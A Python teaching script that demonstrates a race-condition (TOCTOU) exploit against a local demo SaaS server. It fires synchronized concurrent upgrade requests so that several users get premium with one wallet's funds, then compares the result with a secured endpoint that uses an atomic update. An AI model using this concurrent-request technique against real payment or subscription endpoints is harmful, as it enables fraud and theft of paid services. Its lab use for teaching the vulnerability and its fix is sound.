#!/usr/bin/env python3
"""
attack_tool.py - Attack Tool
=============================
Script demonstrating Race Condition exploit.
Sends concurrent requests to vulnerable endpoint.

Usage:
    python attack_tool.py           # Attack vulnerable endpoint
    python attack_tool.py --secure  # Test against secure endpoint
    python attack_tool.py --reset   # Reset system only
"""

import requests
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
BASE_URL = "http://localhost:5000"
NUM_REQUESTS = 5  # Number of concurrent requests (one per user)

# Terminal colors
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'


def print_banner():
    """Display opening banner"""
    banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   ⚔️  RACE CONDITION ATTACK TOOL  ⚔️                              ║
║                                                                   ║
║   TOCTOU Exploit - SaaS Premium Subscription Theft               ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)


def print_section(title):
    """Display section header"""
    print(f"\n{Colors.CYAN}{'═' * 60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}  {title}{Colors.END}")
    print(f"{Colors.CYAN}{'═' * 60}{Colors.END}\n")


def get_stats():
    """Fetch statistics from server"""
    try:
        response = requests.get(f"{BASE_URL}/api/stats")
        return response.json()
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}❌ Error: Cannot connect to server!{Colors.END}")
        print(f"{Colors.YELLOW}   Ensure server is running: python app.py{Colors.END}")
        return None


def print_stats(stats, title="System Status"):
    """Display platform statistics"""
    if not stats:
        return
    
    print_section(title)
    
    # Wallet balance
    balance = stats['wallet']['balance']
    balance_color = Colors.RED if balance < 0 else (Colors.YELLOW if balance < 100 else Colors.GREEN)
    print(f"  💰 Wallet balance: {balance_color}${balance:.2f}{Colors.END}")
    
    # User count
    print(f"  👥 Users: {stats['stats']['free']} Free | {stats['stats']['premium']} Premium")
    
    # User list
    print(f"\n  {Colors.BOLD}User List:{Colors.END}")
    for user in stats['users']:
        status = f"{Colors.YELLOW}👑 Premium{Colors.END}" if user['is_premium'] else f"{Colors.BLUE}Free{Colors.END}"
        print(f"    • {user['name']} (ID: {user['id']}) - {status}")


def send_upgrade_request(user_id, secure=False):
    """
    Send upgrade request to server.
    
    Args:
        user_id: User ID to upgrade
        secure: Use secure endpoint?
    
    Returns:
        dict with request result
    """
    endpoint = "/api/upgrade/secure" if secure else "/api/upgrade"
    url = f"{BASE_URL}{endpoint}"
    
    try:
        response = requests.post(
            url,
            json={"user_id": user_id},
            headers={"Content-Type": "application/json"}
        )
        return {
            "user_id": user_id,
            "status_code": response.status_code,
            "response": response.json()
        }
    except Exception as e:
        return {
            "user_id": user_id,
            "status_code": 0,
            "error": str(e)
        }


def reset_system():
    """Reset system to initial state"""
    print_section("🔄 Resetting system...")
    try:
        response = requests.post(f"{BASE_URL}/api/reset")
        if response.json().get('success'):
            print(f"  {Colors.GREEN}✅ System reset successfully!{Colors.END}")
            return True
    except Exception as e:
        print(f"  {Colors.RED}❌ Reset error: {e}{Colors.END}")
    return False


def launch_attack(secure=False):
    """
    Execute the attack!
    
    Sends NUM_REQUESTS requests concurrently to server.
    All requests are sent at the exact same moment.
    
    Args:
        secure: Attack the secure endpoint?
    """
    endpoint_type = "secure 🟢" if secure else "vulnerable 🔴"
    print_section(f"⚡ Starting attack on {endpoint_type} endpoint")
    
    print(f"  📤 Sending {NUM_REQUESTS} concurrent requests...")
    print(f"  ⏱️  All requests sent simultaneously\n")
    
    # Synchronization barrier - all threads wait for signal to start
    barrier = threading.Barrier(NUM_REQUESTS)
    results = []
    
    def attack_worker(user_id):
        """Worker function for each thread"""
        # Wait for all threads to be ready
        barrier.wait()
        # Send the request
        return send_upgrade_request(user_id, secure)
    
    # Use ThreadPoolExecutor for concurrent sending
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=NUM_REQUESTS) as executor:
        # Send all requests
        futures = [executor.submit(attack_worker, i+1) for i in range(NUM_REQUESTS)]
        
        # Collect results
        for future in as_completed(futures):
            results.append(future.result())
    
    elapsed_time = time.time() - start_time
    
    # Display results
    print_section("📊 Attack Results")
    
    success_count = 0
    for result in sorted(results, key=lambda x: x['user_id']):
        user_id = result['user_id']
        
        if 'error' in result:
            print(f"  ❌ User {user_id}: Error - {result['error']}")
        else:
            response = result['response']
            if response.get('success'):
                success_count += 1
                req_id = response.get('request_id', 'N/A')
                balance_before = response.get('balance_before', 'N/A')
                balance_after = response.get('balance_after', 'N/A')
                print(f"  {Colors.GREEN}✅ User {user_id}: Upgraded!{Colors.END}")
                print(f"     [{req_id}] Balance: ${balance_before} → ${balance_after}")
            else:
                error = response.get('error', 'Unknown error')
                print(f"  {Colors.RED}⊘ User {user_id}: Rejected - {error}{Colors.END}")
    
    # Summary
    print(f"\n  {Colors.BOLD}Summary:{Colors.END}")
    print(f"  • Execution time: {elapsed_time:.3f}s")
    print(f"  • Successful requests: {success_count}/{NUM_REQUESTS}")
    
    if not secure and success_count > 1:
        print(f"\n  {Colors.RED}{Colors.BOLD}🚨 ATTACK SUCCEEDED! 🚨{Colors.END}")
        print(f"  {Colors.RED}   {success_count} users upgraded with single user budget!{Colors.END}")
    elif secure and success_count <= 1:
        print(f"\n  {Colors.GREEN}{Colors.BOLD}🛡️ DEFENSE WORKED! 🛡️{Colors.END}")
        print(f"  {Colors.GREEN}   Only one user upgraded (as expected){Colors.END}")


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Race Condition Attack Tool')
    parser.add_argument('--secure', action='store_true', 
                       help='Attack the secure endpoint')
    parser.add_argument('--reset', action='store_true',
                       help='Reset system only')
    args = parser.parse_args()
    
    print_banner()
    
    # Check server connection
    stats = get_stats()
    if not stats:
        return
    
    # If reset only requested
    if args.reset:
        reset_system()
        stats = get_stats()
        print_stats(stats, "Status After Reset")
        return
    
    # Display status before
    print_stats(stats, "📊 Status Before Attack")
    
    # Check if system needs reset
    if stats['stats']['premium'] > 0 or stats['wallet']['balance'] != 100:
        print(f"\n{Colors.YELLOW}⚠️  System not in initial state. Resetting...{Colors.END}")
        reset_system()
        time.sleep(0.5)
        stats = get_stats()
        print_stats(stats, "📊 Status After Reset")
    
    # Run attack (automatically)
    print(f"\n{Colors.BOLD}🚀 Starting attack...{Colors.END}")
    time.sleep(1)
    launch_attack(secure=args.secure)
    
    # Display status after
    time.sleep(0.5)
    stats = get_stats()
    print_stats(stats, "📊 Status After Attack")
    
    # Final analysis
    print_section("📝 Analysis")
    
    balance = stats['wallet']['balance']
    premium_count = stats['stats']['premium']
    
    if not args.secure:
        if balance < 0:
            print(f"  {Colors.RED}🔴 Vulnerability demonstrated successfully!{Colors.END}")
            print(f"  • Balance dropped to ${balance} (negative!)")
            print(f"  • {premium_count} users upgraded instead of 1")
            print(f"  • Financial loss: ${abs(balance)}")
            print(f"\n  {Colors.YELLOW}💡 Reason:{Colors.END}")
            print(f"     Check and Act were not atomic.")
            print(f"     All requests read same balance ($100) before update.")
        else:
            print(f"  Attack did not fully succeed (server may be slow)")
    else:
        if balance >= 0 and premium_count <= 1:
            print(f"  {Colors.GREEN}🟢 Defense worked!{Colors.END}")
            print(f"  • Balance: ${balance} (not negative)")
            print(f"  • Only {premium_count} user upgraded")
            print(f"\n  {Colors.YELLOW}💡 Why it worked:{Colors.END}")
            print(f"     Atomic update (UPDATE ... WHERE balance >= cost)")
            print(f"     Check and Act executed as single operation.")


if __name__ == "__main__":
    main()
